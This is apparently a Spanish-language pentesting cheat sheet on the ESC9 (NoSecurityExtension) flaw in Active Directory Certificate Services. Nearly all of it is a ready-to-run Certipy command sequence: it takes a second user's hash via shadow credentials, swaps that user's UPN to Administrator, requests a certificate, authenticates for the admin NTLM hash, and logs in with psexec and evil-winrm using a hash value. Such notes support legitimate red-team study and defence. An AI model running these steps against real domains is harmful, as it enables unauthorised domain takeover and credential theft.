# ESC9 - NoSecurityExtension

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC9

Requisitos:
* Template con flag `NoSecurityExtension` en Enrollment Flag

Se necesitan dos usuarios:
* Usuario A tiene GenericWrite sobre el usuario B que puede enrollarse
* El usuario B controlado tiene Enrollment Rights sobre el template


Como identificarlo con Certipy:
* Enrollment Flag: NoSecurityExtension
* [!] Vulnerabilities: ESC9

Por qué es vulnerable:
Sin la extensión de seguridad (szOID_NTDS_CA_SECURITY_EXT), el certificado
no vincula el UPN al SID real del usuario — el DC confía en el UPN del
certificado sin verificar que coincida con el objeto de AD. Esto permite
impersonar a cualquier usuario cambiando el UPN antes de enrollarse.

Condición extra necesaria:
* El usuario atacante debe tener GenericWrite sobre el usuario que se enrolla
  para poder modificar su UPN temporalmente.

ESC9: NoSecurityExtension → modificas el UPN del objeto en AD antes de enrollarte.

## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

❯ certipy-ad find -u 'user' -hashes :hash -dc-ip IP_DC -vulnerable -stdout


Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
```

## ESC9 - Forma 1

```bash 
NOTA: Se necesitan dos usuarios controlados por nosotros
Condiciones:
	- El UserA tiene 'GeneriWrite' sobre UserB
	- UserB tiene 'Enrollment Rights' sobre el template vulnerable ESC9
```

```bash 
Paso 1:
# Obtener el hash del usuario B con el usuario A
❯ certipy-ad shadow auto -u 'UserA@domain.local' -p 'P@$$w0rd123!' -account 'UserB'

# Forma con hash 
❯ certipy-ad shadow auto -u 'UserA@domain.local' -hashes :hash -account 'UserB' -dc-ip IP_DC


Paso 2:
# Cambiar el 'userPrincipalName' del usuario B para ser 'Administrator'
❯ certipy-ad account update -u 'UserA@domain.local' -p 'P@$$w0rd123!' -user 'UserB' -upn Administrator 

# Forma con hash 
❯ certipy-ad account update -u 'UserA@domain.local' -hashes :hash -user 'UserB' -upn Administrator 

Paso 3:
# Solicitar el certificado como administrator '.pfx'
❯ certipy-ad req -u 'UserB@domain.local' -hashes hash -ca 'CA_Name' -template 'Template_Name' -dc-ip IP_DC

Paso 4:
# Regresar al original 
❯ certipy-ad account update -u 'UserA@domain.local' -p 'P@$$w0rd123!' -user 'UserB' -upn UserB@domain.com 

# Forma con hash 
❯ certipy-ad account update -u 'UserA@domain.local' -hashes :hash -user 'UserB' -upn UserB@domain.com  

Paso 5:
# Autenticarse usando el certificado obteniendo un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -domain domain.local -dc-ip IP_DC
```

```bash 
Paso 6:
# Ingresar como la cuenta Administrator 
❯ impacket-psexec administrator@<IP> -hashes :NThash
❯ evil-winrm -i IP_DC -u 'Administrator' -H '4366ec0f86e29be2a4a5e87a1ba922ec'
```

